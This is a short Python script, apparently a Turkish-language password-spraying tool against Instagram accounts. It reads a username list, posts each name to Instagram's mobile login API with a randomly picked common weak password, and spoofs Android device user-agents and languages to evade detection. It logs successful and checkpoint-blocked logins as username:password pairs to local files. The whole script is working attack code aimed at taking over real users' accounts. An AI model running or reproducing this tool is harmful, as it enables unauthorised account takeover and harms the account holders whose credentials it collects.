import random, threading, time, requests
from uuid import uuid4 as rastgele_id
from user_agent import generate_user_agent as rastgele_tarayıcı

dogru = 0   
kontrol = 0 
yanlis = 0  

KIRMIZI = "\033[91m"
YESIL = "\033[92m"
SARI = "\033[93m"
SIFIRLA = "\033[0m"

dosya_adi = input(' Kullanıcı adı listesinin yolunu giriniz : ')
with open(dosya_adi, "r") as f:
    kullanici_adlari = [satir.strip() for satir in f.readlines()]
cihazlar = [
    ("Xiaomi", "POCO", "M2007J20CG", "surya"),
    ("Samsung", "Samsung", "SM-G973F", "beyond1"),
    ("Huawei", "Huawei", "ANE-LX1", "hwANE"),
    ("OnePlus", "OnePlus", "KB2003", "OnePlus8T"),
    ("Sony", "Sony", "XQ-BC52", "pdx214"),
]

surum = "113.0.0.39.122"
islemciler = ["qcom", "exynos", "mtk"]
diller = ["en_US", "ar_SA", "fr_FR", "es_ES"]
cozunurlukler = ["1080x1920", "1080x2009", "720x1520", "1440x2560"]
dpi_listesi = ["240dpi", "320dpi", "450dpi", "560dpi"]

def cihaz_uret():
    android_surum = random.randint(24, 33)  
    dpi = random.choice(dpi_listesi)
    cozunurluk = random.choice(cozunurlukler)
    marka, model_adi, model_kod, cihaz_kodu = random.choice(cihazlar)
    islemci = random.choice(islemciler)
    dil = random.choice(diller)
    return f"Instagram {surum} Android ({android_surum}/{dpi}; {cozunurluk}; {marka}/{model_adi}; {model_kod}; {cihaz_kodu}; {islemci}; {dil})"

url = "https://i.instagram.com/api/v1/accounts/login/"

for kullanici in kullanici_adlari:
    veri = {
        "username": kullanici,
        "password": random.choice([
            '123456','1234567','12345678','123456789',
            '1234567890','112233','123123','11223344','12345678910'
        ]),
        "device_id": str(rastgele_id())
    }
    basliklar = {
        'User-Agent': cihaz_uret(),
        'Accept-Language': random.choice([
            "en-US","pt-BR","en-IN","id-ID","ru-RU","tr-TR",
            "ja-JP","es-MX","en-GB","de-DE"
        ]),
    }   
    cevap = requests.post(url, headers=basliklar, data=veri)   

    if '"logged_in_user"' in cevap.text:
        dogru += 1
        print(f'{YESIL}Doğru : {dogru} | {SARI}Kontrol : {kontrol} | {KIRMIZI}Yanlış : {yanlis} | Sahal' + SIFIRLA)
        with open('dogru_hesaplar.txt', 'a') as kayit:
            kayit.write(f'{kullanici} : {veri["password"]}\n')

    elif 'checkpoint_required' in cevap.text:
        kontrol += 1
        print(f'{YESIL}Doğru : {dogru} | {SARI}Kontrol : {kontrol} | {KIRMIZI}Yanlış : {yanlis} | Sahal' + SIFIRLA)
        with open('hit.txt', 'a') as kayit:
            kayit.write(f'{kullanici} : {veri["password"]}\n')

    else:
        yanlis += 1
        print(f'{YESIL}Doğru : {dogru} | {SARI}Kontrol : {kontrol} | {KIRMIZI}Yanlış : {yanlis}' + SIFIRLA)
    time.sleep(0.5)